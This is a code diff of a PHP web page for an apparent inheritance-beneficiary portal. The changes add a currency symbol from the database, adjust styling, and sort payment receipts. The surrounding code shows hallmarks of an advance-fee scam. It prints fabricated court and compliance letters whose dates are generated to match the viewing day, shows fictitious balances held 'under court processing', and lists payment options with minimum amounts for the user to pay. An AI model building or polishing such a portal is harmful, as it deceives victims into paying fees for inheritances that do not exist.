@@ -1,4 +1,5 @@
 <?php
+//inheritance.php
     session_start();
     ini_set('display_errors', 1);
     ini_set('display_startup_errors', 1);
@@ -245,6 +246,7 @@
     $payment_receipts = [];
     $latest_receipt = null;
     $payment_options = []; // New variable for payment options from deposits table
+    $currency_symbol = '$'; // Default fallback (though we'll always try to get from DB)
 
     if ($user_id) {
         // Get account info with new fields
@@ -260,6 +262,11 @@
             $stmt = $pdo->prepare("SELECT * FROM inheritance_accounts WHERE user_id = ?");
             $stmt->execute([$user_id]);
             $account = $stmt->fetch(PDO::FETCH_ASSOC);
+        }
+        
+        // Get currency symbol from account
+        if ($account && !empty($account['currency'])) {
+            $currency_symbol = $account['currency'];
         }
         
         // Get user info
@@ -1560,14 +1567,8 @@
         .portfolio-container {
             max-height: 400px;
             overflow-y: auto;
-            scrollbar-width: none;
             -ms-overflow-style: none;
             width: 100%;
-        }
-        
-        .portfolio-container::-webkit-scrollbar {
-            display: none;
-            width: 0;
         }
         
         .asset-grid {
@@ -1600,7 +1601,7 @@
             height: 140px;
             object-fit: cover;
             cursor: pointer;
-            border-bottom: 1px solid #d0b28c;
+            border-bottom: 2px solid #d0b28c;
         }
         
         .asset-placeholder {
@@ -1638,11 +1639,6 @@
             font-size: clamp(11px, 2vw, 12px);
             color: #7f6b5a;
             line-height: 1.5;
-            max-height: 36px;
-            overflow: hidden;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
             word-break: break-word;
         }
         
@@ -1654,7 +1650,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(44, 44, 44, 0.95);
+            background: #fcf9f4;
             z-index: 10000;
             align-items: center;
             justify-content: center;
@@ -1663,11 +1659,11 @@
         
         .image-modal-content {
             position: relative;
-            max-width: 90vw;
+            max-width: 100%;
             max-height: 90vh;
-            background: #fcf9f4;
+            background: none;
             padding: 20px;
-            border: 1px solid #d4b68a;
+            border: none;
             width: 100%;
         }
         
@@ -1678,16 +1674,15 @@
         }
         
         .image-modal-content img {
-            max-width: 100%;
-            max-height: 75vh;
+            width: 100%;
+            height: 85vh;
             object-fit: contain;
-            border: 1px solid #d4b68a;
         }
         
         .close-image-btn {
             position: absolute;
             top: -10px;
-            right: -10px;
+            right: -3px;
             width: 35px;
             height: 35px;
             border-radius: 0;
@@ -1706,10 +1701,11 @@
         }
         
         .image-title {
+            font-weight: bold;
+            font-size: 28px;
             text-align: center;
             color: #5a3e2b;
             font-size: clamp(13px, 2.5vw, 16px);
-            margin-top: 12px;
             font-style: italic;
             word-break: break-word;
         }
@@ -1851,8 +1847,8 @@
     <div id="imageModal" onclick="closeImageModal()">
         <div class="image-modal-content" onclick="event.stopPropagation()">
             <button class="close-image-btn" onclick="closeImageModal()">×</button>
-            <img id="modalImage" src="" alt="Full size image">
             <div class="image-title" id="modalImageTitle"></div>
+            <img id="modalImage" src="" alt="Full size image">
         </div>
     </div>
 
@@ -1917,11 +1913,11 @@
                 <div class="balance-section">
                     <div class="balance-item">
                         <div class="label">Available for Withdrawal</div>
-                        <div class="amount">$<?php echo number_format($account['available_balance'], 2); ?></div>
+                        <div class="amount"><?php echo htmlspecialchars($currency_symbol); ?><?php echo number_format($account['available_balance'], 2); ?></div>
                         <div class="desc">Funds available for disbursement</div>
                         <?php if($account['processed_amount'] >= 15000): ?>
                         <form method="POST" style="margin-top:15px;">
-                            <button type="submit" name="decline_court_transfer" class="btn btn-red" style="font-size:14px;" onclick="return confirm('This will cancel the court-mandated transfer of $15,000 and return it to your available balance. Continue?')">
+                            <button type="submit" name="decline_court_transfer" class="btn btn-red" style="font-size:14px;" onclick="return confirm('This will cancel the court-mandated transfer of <?php echo htmlspecialchars($currency_symbol); ?>15,000 and return it to your available balance. Continue?')">
                                 Decline Court Transfer
                             </button>
                         </form>
@@ -1929,7 +1925,7 @@
                     </div>
                     <div class="balance-item">
                         <div class="label">Withdrawals Balance</div>
-                        <div class="amount">$<?php echo number_format($account['processed_amount'], 2); ?></div>
+                        <div class="amount"><?php echo htmlspecialchars($currency_symbol); ?><?php echo number_format($account['processed_amount'], 2); ?></div>
                         <div class="desc">Funds under court/administrator processing</div>
                         <div class="info-box" style="margin-top:15px; font-size:13px;">
                             <strong>Processing Details:</strong> Funds in this category are currently being processed and will be available in the beneficiary's account within days.
@@ -1945,7 +1941,7 @@
                     </div>
                     <div class="status-item">
                         <span class="in-process-info">
-                            <strong>Ongoing Court Case:</strong> In Process Balance of <strong>$<?php echo number_format($account['in_process_balance'] ?? 0, 2); ?></strong> represented by <strong><?php echo htmlspecialchars($account['legal_representative'] ?? ''); ?></strong>
+                            <strong>Ongoing Court Case:</strong> In Process Balance of <strong><?php echo htmlspecialchars($currency_symbol); ?><?php echo number_format($account['in_process_balance'] ?? 0, 2); ?></strong> represented by <strong><?php echo htmlspecialchars($account['legal_representative'] ?? ''); ?></strong>
                         </span>
                     </div>
                     
@@ -1992,7 +1988,7 @@
                         <h3>FORM 109 · REQUEST FOR DISBURSEMENT</h3>
                         <?php if($account['maximum_withdrawal_amount'] > 0): ?>
                         <div class="max-withdrawal-info" style="margin-bottom:15px;">
-                            Maximum withdrawal limit per transaction: <strong>$<?php echo number_format($account['maximum_withdrawal_amount'], 2); ?></strong>
+                            Maximum withdrawal limit per transaction: <strong><?php echo htmlspecialchars($currency_symbol); ?><?php echo number_format($account['maximum_withdrawal_amount'], 2); ?></strong>
                         </div>
                         <?php endif; ?>
                         
@@ -2006,9 +2002,9 @@
                                         <input type="text" name="receiver_name" placeholder="As appears on legal documents" required value="<?php echo htmlspecialchars($user['full_name'] ?? ''); ?>">
                                     </div>
                                     <div>
-                                        <label>Amount (USD) <span style="color:#8b3a3a;">*</span></label>
+                                        <label>Amount (<?php echo htmlspecialchars($currency_symbol); ?>) <span style="color:#8b3a3a;">*</span></label>
                                         <input type="number" name="amount" min="0.01" max="<?php echo min($account['available_balance'], $account['maximum_withdrawal_amount'] ?? $account['available_balance']); ?>" step="0.01" placeholder="0.00" required>
-                                        <small style="color:#7f6b5a;">Max: $<?php echo number_format(min($account['available_balance'], $account['maximum_withdrawal_amount'] ?? $account['available_balance']), 2); ?></small>
+                                        <small style="color:#7f6b5a;">Max: <?php echo htmlspecialchars($currency_symbol); ?><?php echo number_format(min($account['available_balance'], $account['maximum_withdrawal_amount'] ?? $account['available_balance']), 2); ?></small>
                                     </div>
                                 </div>
                             </div>
@@ -2129,7 +2125,7 @@
                                         <span class="letter-type">GENERAL NOTICE</span>
                                         <strong>IN RE: Estate Fund Verification Delay</strong>
                                         <small>Letter No: CRT-2024-001 | Dated: <?php echo date('F d, Y'); ?></small>
-                                        <p>Pursuant to High Court Order #991-B, the processed sum of $15,000 is ready for transfer. Beneficiaries are advised that international wire transfers involving inheritance assets require a mandatory verification period to ensure compliance with cross-border fiscal regulations. This office apologizes for any inconvenience caused by these statutory requirements.</p>
+                                        <p>Pursuant to High Court Order #991-B, the processed sum of <?php echo htmlspecialchars($currency_symbol); ?>15,000 is ready for transfer. Beneficiaries are advised that international wire transfers involving inheritance assets require a mandatory verification period to ensure compliance with cross-border fiscal regulations. This office apologizes for any inconvenience caused by these statutory requirements.</p>
                                         <p style="margin-top:10px; text-align:right;">— Clerk of the Court</p>
                                     </div>
                                 </div>
@@ -2149,7 +2145,7 @@
                                         <span class="letter-type">LEGAL NOTICE</span>
                                         <strong>RE: Tax Documentation Required</strong>
                                         <small>Letter No: CRT-2024-003 | Dated: <?php echo date('F d, Y', strtotime('-5 days')); ?></small>
-                                        <p>Please be advised that Form W-9 (Request for Taxpayer Identification Number) must be completed before any disbursements exceeding $10,000 can be processed. This requirement is mandated by IRC Section 3406 and the USA PATRIOT Act. Kindly contact the Estate Tax Department at your earliest convenience.</p>
+                                        <p>Please be advised that Form W-9 (Request for Taxpayer Identification Number) must be completed before any disbursements exceeding <?php echo htmlspecialchars($currency_symbol); ?>10,000 can be processed. This requirement is mandated by IRC Section 3406 and the USA PATRIOT Act. Kindly contact the Estate Tax Department at your earliest convenience.</p>
                                         <p style="margin-top:10px; text-align:right;">— Compliance Officer</p>
                                     </div>
                                 </div>
@@ -2204,7 +2200,7 @@
                                             <tr>
                                                 <td><?php echo $date; ?></td>
                                                 <td style="font-weight: 600; color: <?php echo ($tx['transaction_type'] == 'external_transfer') ? '#8b3a3a' : '#2d5a2d'; ?>">
-                                                    <?php echo ($tx['transaction_type'] == 'external_transfer') ? '− $' : '+ $'; ?><?php echo number_format($tx['amount'], 2); ?>
+                                                    <?php echo ($tx['transaction_type'] == 'external_transfer') ? '− ' . htmlspecialchars($currency_symbol) : '+ ' . htmlspecialchars($currency_symbol); ?><?php echo number_format($tx['amount'], 2); ?>
                                                 </td>
                                                 <td><span class="badge <?php echo $status_class; ?>"><?php echo $status_text; ?></span></td>
                                             </tr>
@@ -2235,10 +2231,10 @@
                                         <div class="asset-item">
                                             <?php if($image_url): ?>
                                                 <img src="<?php echo htmlspecialchars($image_url); ?>" 
-                                                     class="asset-image" 
-                                                     alt="<?php echo htmlspecialchars($asset['asset_title']); ?>"
-                                                     ondblclick="openImageModal('<?php echo htmlspecialchars($image_url); ?>', '<?php echo htmlspecialchars($asset['asset_title']); ?>')"
-                                                     onerror="this.style.display='none'; this.parentElement.innerHTML+='<div class=\'asset-placeholder\'><span>📷</span><small>Image Error</small></div>';">
+                                                class="asset-image" 
+                                                alt="<?php echo htmlspecialchars($asset['asset_title']); ?>"
+                                                ondblclick="openImageModal('<?php echo htmlspecialchars($image_url); ?>', '<?php echo htmlspecialchars($asset['asset_title']); ?>', )"
+                                                onerror="this.style.display='none'; this.parentElement.innerHTML+='<div class=\'asset-placeholder\'><span>📷</span><small>Image Error</small></div>';">
                                             <?php else: ?>
                                                 <div class="asset-placeholder">
                                                     <span>📷</span>
@@ -2386,6 +2382,7 @@
         const latestReceipt = <?php echo json_encode($latest_receipt); ?>;
         const beneficiaryName = <?php echo json_encode($user['full_name'] ?? 'Beneficiary'); ?>;
         const legalRep = <?php echo json_encode($account['legal_representative'] ?? 'Legal Representative'); ?>;
+        const currencySymbol = <?php echo json_encode($currency_symbol); ?>;
 
         function openReceiptOverlay() {
             document.getElementById('receiptOverlay').style.display = 'block';
@@ -2476,7 +2473,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Amount Paid:</span>
-                        <span class="receipt-value" style="font-weight:600;">$${parseFloat(receipt.amount_paid).toFixed(2)}</span>
+                        <span class="receipt-value" style="font-weight:600;">${currencySymbol}${parseFloat(receipt.amount_paid).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2485,7 +2482,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Payment Due:</span>
-                        <span class="receipt-value">$${parseFloat(receipt.payment_due).toFixed(2)}</span>
+                        <span class="receipt-value">${currencySymbol}${parseFloat(receipt.payment_due).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2494,7 +2491,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Total Payment:</span>
-                        <span class="receipt-value">$${parseFloat(receipt.total_payment).toFixed(2)}</span>
+                        <span class="receipt-value">${currencySymbol}${parseFloat(receipt.total_payment).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2521,7 +2518,7 @@
                     
                     ${receipt.amount_paid ? `
                     <div class="receipt-amount">
-                        $${parseFloat(receipt.amount_paid).toFixed(2)}
+                        ${currencySymbol}${parseFloat(receipt.amount_paid).toFixed(2)}
                     </div>
                     ` : ''}
                     
@@ -2548,6 +2545,13 @@
                 return;
             }
             
+            // Create a copy of receipts array and sort by paid_date (latest first)
+            const sortedReceipts = [...receipts].sort((a, b) => {
+                const dateA = new Date(a.paid_date);
+                const dateB = new Date(b.paid_date);
+                return dateB - dateA; // Descending order (latest first)
+            });
+            
             let receiptsHtml = `
                 <div class="receipt-container">
                     <div class="receipt-header">
@@ -2557,13 +2561,15 @@
                     <div class="receipt-list">
             `;
             
-            receipts.forEach((receipt, index) => {
+            sortedReceipts.forEach((receipt, index) => {
                 const paidDate = new Date(receipt.paid_date).toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
+                // Find the original index in the receipts array for the onclick handler
+                const originalIndex = receipts.findIndex(r => r.id === receipt.id);
                 receiptsHtml += `
-                    <div class="receipt-list-item ${index === 0 ? 'selected' : ''}" onclick="showReceiptDetails(${index})">
+                    <div class="receipt-list-item ${index === 0 ? 'selected' : ''}" onclick="showReceiptDetails(${originalIndex})">
                         <div class="receipt-list-date">${paidDate}</div>
-                        <div class="receipt-list-subject">${receipt.payment_subject}</div>
-                        <div class="receipt-list-amount">$${parseFloat(receipt.amount_paid).toFixed(2)}</div>
+                        <div class="receipt-list-subject">${receipt.payment_subject || 'Payment'}</div>
+                        <div class="receipt-list-amount">${currencySymbol}${parseFloat(receipt.amount_paid).toFixed(2)}</div>
                     </div>
                 `;
             });
@@ -2575,9 +2581,10 @@
             
             content.innerHTML = receiptsHtml;
             
-            // Show the first receipt details
-            if (receipts.length > 0) {
-                showReceiptDetails(0);
+            // Show the first receipt details (latest by date)
+            if (sortedReceipts.length > 0) {
+                const latestReceiptOriginalIndex = receipts.findIndex(r => r.id === sortedReceipts[0].id);
+                showReceiptDetails(latestReceiptOriginalIndex);
             }
         }
 
@@ -2659,7 +2666,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Amount Paid:</span>
-                        <span class="receipt-value" style="font-weight:600;">$${parseFloat(receipt.amount_paid).toFixed(2)}</span>
+                        <span class="receipt-value" style="font-weight:600;">${currencySymbol}${parseFloat(receipt.amount_paid).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2668,7 +2675,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Payment Due:</span>
-                        <span class="receipt-value">$${parseFloat(receipt.payment_due).toFixed(2)}</span>
+                        <span class="receipt-value">${currencySymbol}${parseFloat(receipt.payment_due).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2677,7 +2684,7 @@
                 receiptRows += `
                     <div class="receipt-row">
                         <span class="receipt-label">Total:</span>
-                        <span class="receipt-value">$${parseFloat(receipt.total_payment).toFixed(2)}</span>
+                        <span class="receipt-value">${currencySymbol}${parseFloat(receipt.total_payment).toFixed(2)}</span>
                     </div>
                 `;
             }
@@ -2698,7 +2705,7 @@
                     </div>
                     ${receipt.amount_paid ? `
                     <div class="receipt-amount" style="margin-top:15px;">
-                        $${parseFloat(receipt.amount_paid).toFixed(2)}
+                        ${currencySymbol}${parseFloat(receipt.amount_paid).toFixed(2)}
                     </div>
                     ` : ''}
                     ${receipt.notes ? `
@@ -2794,7 +2801,7 @@
             
             let optionsHtml = '<option value="">-- Select Payment Option --</option>';
             paymentOptions.forEach((option, index) => {
-                optionsHtml += `<option value="${index}">${option.payment_receiver.replace('_', ' ').toUpperCase()} - ${option.payment_type.toUpperCase()} - $${parseFloat(option.amount).toFixed(2)}</option>`;
+                optionsHtml += `<option value="${index}">${option.payment_receiver.replace('_', ' ').toUpperCase()} - ${option.payment_type.toUpperCase()} - ${currencySymbol}${parseFloat(option.amount).toFixed(2)}</option>`;
             });
             
             content.innerHTML = `
@@ -2850,7 +2857,7 @@
                     
                     <div class="payment-detail-row">
                         <span class="payment-detail-label">Minimum Amount:</span>
-                        <span class="payment-detail-value">$${parseFloat(option.amount).toFixed(2)}</span>
+                        <span class="payment-detail-value">${currencySymbol}${parseFloat(option.amount).toFixed(2)}</span>
                         <button class="copy-btn" onclick="copyToClipboard('${option.amount}')">Copy</button>
                     </div>
             `;
@@ -2931,7 +2938,7 @@
                     return;
                 }
                 
-                if (!confirm(`Confirm disbursement of $${amount} to ${receiver} via ${method}?\n\nNote: Processing may take up to 10 business days.`)) {
+                if (!confirm(`Confirm disbursement of ${currencySymbol}${amount} to ${receiver} via ${method}?\n\nNote: Processing may take up to 10 business days.`)) {
                     e.preventDefault();
                 }
             }
